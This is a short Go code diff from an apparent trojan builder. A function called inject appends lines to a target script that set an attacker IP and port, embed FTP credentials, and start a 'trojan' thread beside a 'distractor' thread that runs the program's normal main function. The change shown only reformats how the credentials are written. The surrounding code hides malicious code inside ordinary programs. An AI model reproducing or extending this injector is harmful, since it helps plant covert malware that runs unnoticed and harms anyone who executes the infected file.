@@ -58,7 +58,7 @@ func inject(ip string, port uint, file string, ftpCredentials []string) error {
 
 	fd.Write(buffer)
 	fd.Write([]byte(fmt.Sprintf("\n    IP=\"%s\";PORT=%d", ip, port)))
-	fd.Write([]byte(fmt.Sprintf("\n    ftp_credentials=%+v", ftpCredentials)))
+	fd.Write([]byte(fmt.Sprintf("\n    ftp_credentials=%s", console.FmtArray(ftpCredentials))))
 	fd.Write([]byte("\n    distractor_thread = threading.Thread(target=main);trojan_thread = threading.Thread(target=trojan)"))
     fd.Write([]byte("\n    distractor_thread.start();trojan_thread.start()"))
 
